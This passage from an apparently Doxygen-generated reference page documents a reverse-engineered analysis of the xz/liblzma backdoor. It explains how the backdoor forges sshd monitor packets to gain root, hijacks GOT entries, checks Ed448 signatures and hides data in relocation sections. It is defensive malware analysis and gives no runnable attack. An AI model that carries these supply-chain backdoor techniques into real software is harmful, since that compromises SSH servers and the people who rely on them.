    <tr><td class="paramname">skip_root_patch</td><td>TRUE to keep current configuration, FALSE to enable root login </td></tr>
    <tr><td class="paramname">disable_pam</td><td>TRUE to disable PAM, FALSE to keep current configuration </td></tr>
    <tr><td class="paramname">replace_monitor_reqtype</td><td>TRUE to replace the <code>type</code> field in <code>struct mon_table</code> for <code>MONITOR_REQ_AUTHPASSWORD</code>. FALSE to increment it by 1 (from <code>MONITOR_REQ_AUTHPASSWORD</code> to <code>MONITOR_ANS_AUTHPASSWORD</code>) </td></tr>
    <tr><td class="paramname">monitor_reqtype</td><td>the new value to apply, if <code>replace_monitor_reqtype</code> is TRUE </td></tr>
    <tr><td class="paramname">global_ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE if modifications couldn't be applied </dd></dl>

</div>
</div>
<a id="a60b93ed64ba904012e9fa9477e97a244"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a60b93ed64ba904012e9fa9477e97a244">&#9670;&nbsp;</a></span>sshd_proxy_elevate()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_proxy_elevate </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a> *&#160;</td>
          <td class="paramname"><em>args</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>forges a new <code>MONITOR_REQ_KEYALLOWED</code> packet, and injects it into the server to gain root privileges through the sshd monitor. </p>
<p>this function is called if the calling function, <a class="el" href="xzre_8h.html#add930f2364d6ac0711ec484781f00f03">run_backdoor_commands</a> , is invoked without root (which is what normally happens when sshd is sandboxed)</p>
<p>the code will then construct a new packet and send a monitor request with type <code>MONITOR_REQ_KEYALLOWED</code> and the payload as key. the receiving end (<code>mm_answer_keyallowed</code>) will then run the payload through <a class="el" href="xzre_8h.html#a8ce260e9315b4afa70668391058ed484">mm_answer_keyallowed_hook</a></p>
<p>the <code>disable_backdoor</code> flag is used to avoid running the payload more than once, in case of multiple calls</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">args</td><td>arguments used to build the SSH packet </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the packet was sent successfully, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ad3a61f27a1663eb3e0b25b861c85fe3c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad3a61f27a1663eb3e0b25b861c85fe3c">&#9670;&nbsp;</a></span>update_got_address()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* update_got_address </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>entry_ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds the __tls_get_addr() GOT entry </p>
<p>this function first computes the location of the __tls_get_addr() PLT trampoline function by using the PLT offset constant from tls_get_addr_reloc_consts</p>
<p>then it decodes the PLT jmp instruction to get the address of the __tls_get_addr() GOT entry</p>
<p>the __tls_get_addr() GOT entry is used in <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423" title="the backdoor main method that installs the backdoor_symbind64() callback">backdoor_setup()</a> to find the ELF header at the start of the memory mapped ld.so</p>
<p>calls <a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df" title="get the tls_get_addr_random_symbol GOT offset">get_tls_get_addr_random_symbol_got_offset()</a> to update elf_entry_ctx_t::got_ptr and elf_entry_ctx_t::got_offset sets elf_entry_ctx_t::got_offset = 0 sets elf_entry_ctx_t::cpuid_fn = 0 stores the address of the __tls_get_addr() GOT entry in elf_entry_ctx_t::got_ptr</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">entry_ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the __tls_get_addr() GOT entry </dd></dl>

</div>
</div>
<a id="a127444706ffc25ccce1ee267c014957d"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a127444706ffc25ccce1ee267c014957d">&#9670;&nbsp;</a></span>update_got_offset()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void update_got_offset </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>updates the offset to the GOT </p>
<p>the offset is the distance to the GOT relative to the address of the symbol cpuid_random_symbol this value is stored in elf_entry_ctx_t.got_ctx.got_offset</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>ptrdiff_t </dd></dl>

</div>
</div>
<a id="a0b6e4a4a74a67f0e049b2d7973480a95"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a0b6e4a4a74a67f0e049b2d7973480a95">&#9670;&nbsp;</a></span>validate_log_handler_pointers()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL validate_log_handler_pointers </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>addr1</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>addr2</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>search_base</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>global</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Validate that the two addresses are the expected/correct ones. </p>
<p>The addresses must be within 15 bytes of each other</p>
<ol type="1">
<li>Start looking in the XREF_Could_not_get_agent_socket function</li>
<li>Search for a lea refering mm_log_handler</li>
<li>If the next instruction after it is a call, switch to the target function</li>
<li>Look for a memory instruction referencing addr1</li>
<li>Look for a memory instruction referencing addr2</li>
</ol>
<p>So, looking for the call to set_log_handler in sshd.c::privsep_preauth:</p>
<p>set_log_handler(mm_log_handler, pmonitor);</p>
<p>Which looks like this:</p>
<p>void set_log_handler(log_handler_fn *handler, void *ctx) { log_handler = handler; log_handler_ctx = ctx; }</p>
<p>And the two addresses in question are log_handler and log_handler_ctx.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">log_handler_addr1</td><td>first address to validate </td></tr>
    <tr><td class="paramname">log_handler_addr2</td><td>second address to validate </td></tr>
    <tr><td class="paramname">search_base</td><td>lowest valid code address </td></tr>
    <tr><td class="paramname">code_end</td><td>higest valid code address </td></tr>
    <tr><td class="paramname">refs</td><td>string references </td></tr>
    <tr><td class="paramname">global</td><td>the global context </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>TRUE if all checks pass, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a0b0ce96673cd8ebf4541cff2b20dfe86"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a0b0ce96673cd8ebf4541cff2b20dfe86">&#9670;&nbsp;</a></span>verify_signature()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL verify_signature </td>
          <td>(</td>
          <td class="paramtype">struct <a class="el" href="structsshkey.html">sshkey</a> *&#160;</td>
          <td class="paramname"><em>sshkey</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>signed_data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>sshkey_digest_offset</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>signed_data_size</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>signature</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>ed448_raw_key</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>global_ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Checks if <code>signed_data</code> is signed with <code>ed448_raw_key</code>. </p>
<p>in order to do this, the code will</p><ul>
<li>compute a sha256 hash of the SSH host key in <code>sshkey</code> (after serialization) and write it to <code>signed_data</code> at offset <code>sshkey_digest_offset</code> </li>
<li>load the ED448 key from <code>ed448_raw_key</code> </li>
<li>use it to verify <code>signed_data</code> (including the hashed SSH host key)</li>
</ul>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">sshkey</td><td>the SSH host key </td></tr>
    <tr><td class="paramname">signed_data</td><td>data to verify, including an empty space to hold the hashed SSH key </td></tr>
    <tr><td class="paramname">sshkey_digest_offset</td><td>offset to write the hashed SSH key to, in <code>signed_data</code> </td></tr>
    <tr><td class="paramname">signed_data_size</td><td>length of the <code>signed_data</code> buffer, including the space for the SSH key hash digest </td></tr>
    <tr><td class="paramname">signature</td><td>signature of the signed data to check </td></tr>
    <tr><td class="paramname">ed448_raw_key</td><td>the ED448 public key obtained from <a class="el" href="xzre_8h.html#a80592f231ad06e5a8ba204e6ff685827">secret_data_get_decrypted</a> </td></tr>
    <tr><td class="paramname">global_ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the signature verification is successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a6ad15241561f71f06020fb6f2649e6a3"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6ad15241561f71f06020fb6f2649e6a3">&#9670;&nbsp;</a></span>x86_dasm()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL x86_dasm </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>disassembles the given x64 code </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td>empty disassembler context to hold the state </td></tr>
    <tr><td class="paramname">code_start</td><td>pointer to the start of buffer (first disassemblable location) </td></tr>
    <tr><td class="paramname">code_end</td><td>pointer to the end of the buffer </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if disassembly was successful, FALSE otherwise </dd></dl>

</div>
</div>
<h2 class="groupheader">Variable Documentation</h2>
<a id="ac7d6a45076bf21904bac3163ae57090e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ac7d6a45076bf21904bac3163ae57090e">&#9670;&nbsp;</a></span>cpuid_random_symbol</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const u64 cpuid_random_symbol</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>a bogus global variable that is used by the backdoor to generate an extra symbol </p>
<p>inside a .rodata section</p>
<p>the symbol is used by <a class="el" href="xzre_8h.html#a0ab331c3c38da2d4aa29f1c9178050fc" title="initialises the elf_entry_ctx_t">init_elf_entry_ctx()</a> </p>

</div>
</div>
<a id="a6ee0871d6d6f7544176777c8f00244b7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6ee0871d6d6f7544176777c8f00244b7">&#9670;&nbsp;</a></span>cpuid_reloc_consts</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const <a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a> cpuid_reloc_consts</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .rodata section that contains _cpuid() related GOT offsets </p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>used by call_backdoor_init_stage2(), <a class="el" href="xzre_8h.html#a127444706ffc25ccce1ee267c014957d" title="updates the offset to the GOT">update_got_offset()</a> and <a class="el" href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99" title="get the cpuid() GOT index">get_cpuid_got_index()</a> </p>

</div>
</div>
<a id="a43a1216740525fdfa050474fc9b91a57"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a43a1216740525fdfa050474fc9b91a57">&#9670;&nbsp;</a></span>elf_functions</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const <a class="el" href="structelf__functions.html">elf_functions_t</a> <a class="el" href="structelf__functions.html">elf_functions</a></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .data.rel.ro section that contains addresses to various functions </p>
<p>appears to be another obfuscation attempt</p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>used by <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a> and <a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df" title="get the tls_get_addr_random_symbol GOT offset">get_tls_get_addr_random_symbol_got_offset()</a></p>
<p>used by </p>

</div>
</div>
<a id="a4623e8d4254091bcbffbead1ee7ed2ff"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a4623e8d4254091bcbffbead1ee7ed2ff">&#9670;&nbsp;</a></span>elf_functions_offset</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const ptrdiff_t elf_functions_offset</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .data.rel.ro section that contains the offset to <a class="el" href="structelf__functions.html">elf_functions</a> </p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>the variable maps to a relocation entry of type R_X86_64_64 and value elf_functions-0x2a0 </p>

</div>
</div>
<a id="a654fa519cae913e8f1b0c5ad54f8cc3a"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a654fa519cae913e8f1b0c5ad54f8cc3a">&#9670;&nbsp;</a></span>fake_lzma_allocator</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a> <a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .data.rel.ro section that contains a fake lzma_allocator </p>
<p>the fake lzma_allocator makes lzma_alloc() call <a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584" title="a fake alloc function called by lzma_alloc() that then calls elf_symbol_get_addr()">fake_lzma_alloc()</a></p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>lzma_allocator::alloc is the address of <a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584" title="a fake alloc function called by lzma_alloc() that then calls elf_symbol_get_addr()">fake_lzma_alloc()</a> the field maps to a relocation entry of type R_X86_64_64 and value fake_lzma_alloc</p>
<p>lzma_allocator::free is the address of <a class="el" href="xzre_8h.html#a5565761b59b3ef6786b83a9b50f72b17" title="a fake free function called by lzma_free()">fake_lzma_free()</a> the field maps to a relocation entry of type R_X86_64_64 and value fake_lzma_free</p>
<p>lzma_allocator::opaque is the address of <a class="el" href="xzre_8h.html#a6ad15241561f71f06020fb6f2649e6a3" title="disassembles the given x64 code">x86_dasm()</a> the field maps to a relocation entry of type R_X86_64_64 and value x86_dasm </p>

</div>
</div>
<a id="aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aaab5bc3cf0e40bb0aa5bc72a3fd05fbe">&#9670;&nbsp;</a></span>fake_lzma_allocator_offset</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const ptrdiff_t fake_lzma_allocator_offset</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .data.rel.ro section that contains the offset to fake_lzma_allocator_struct </p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>the variable maps to a relocation entry of type R_X86_64_GOTOFF64 and value cpuid_random_symbol-0x180</p>
<p>used by <a class="el" href="xzre_8h.html#a048b695303b409f486861de0c24d6097" title="gets the address of the fake LZMA allocator">get_lzma_allocator_address()</a> </p>

</div>
</div>
<a id="a32c97a88bc607d3f2459f0d7d420099d"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a32c97a88bc607d3f2459f0d7d420099d">&#9670;&nbsp;</a></span>hooks_data_addr</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>* hooks_data_addr</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>location of backdoor_hooks_data_t </p>
<p>set in <a class="el" href="xzre_8h.html#a1fcba1b3d069ccf76ee3cef4a3b9a682" title="scans loaded libraries to identify interesting libraries and populate related data">process_shared_libraries_map()</a> to a location in the spare bytes after the last liblzma data segment </p>

</div>
</div>
<a id="ab9c7b9765c15a48fbed3d1a8daf1b27f"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ab9c7b9765c15a48fbed3d1a8daf1b27f">&#9670;&nbsp;</a></span>resolver_call_count</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">u32 resolver_call_count</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>counts the number of times the IFUNC resolver is called </p>
<p>used by <a class="el" href="xzre_8h.html#a4662813f09936a772b6682e8bdd0be62" title="calls backdoor_init_stage2 by disguising it as a call to cpuid.">backdoor_init()</a> </p>

</div>
</div>
<a id="a53450f0faa9d81b24f8cee5731b51a58"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a53450f0faa9d81b24f8cee5731b51a58">&#9670;&nbsp;</a></span>string_action_data</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const u32 string_action_data[1304]</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>contains action data for the encoded string radix tree </p>
<p>inside a .rodata section</p>
<p>used by <a class="el" href="xzre_8h.html#a6189320317764e3344934873b58b30b1" title="Get the.">get_string_id()</a> </p>

</div>
</div>
<a id="a8c67ac851c8ec7f40c406b286233f98e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8c67ac851c8ec7f40c406b286233f98e">&#9670;&nbsp;</a></span>string_mask_data</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const u64 string_mask_data[238]</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>contains mask data for the encoded string radix tree </p>
<p>inside a .rodata section</p>
<p>used by <a class="el" href="xzre_8h.html#a6189320317764e3344934873b58b30b1" title="Get the.">get_string_id()</a> </p>

</div>
</div>
<a id="a3101b150fe0226a632314e2fa473aba1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a3101b150fe0226a632314e2fa473aba1">&#9670;&nbsp;</a></span>tls_get_addr_random_symbol</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const u64 tls_get_addr_random_symbol</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>a bogus global variable that is used by the backdoor to generate an extra symbol </p>
<p>inside a .rodata section</p>
<p>the symbol is used by <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a> </p>

</div>
</div>
<a id="aadd306e1b2b33d0306f1995e0a83dae7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aadd306e1b2b33d0306f1995e0a83dae7">&#9670;&nbsp;</a></span>tls_get_addr_reloc_consts</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const <a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts_t</a> tls_get_addr_reloc_consts</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .rodata section that contains __tls_get_addr() related GOT offsets </p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>used by <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a> and <a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df" title="get the tls_get_addr_random_symbol GOT offset">get_tls_get_addr_random_symbol_got_offset()</a> </p>

</div>
</div>
</div><!-- contents -->
<!-- start footer part -->
<hr class="footer"/><address class="footer"><small>
Generated by&#160;<a href="https://www.doxygen.org/index.html"><img class="footer" src="doxygen.svg" width="104" height="31" alt="doxygen"/></a> 1.9.1
</small></address>
</body>
</html>
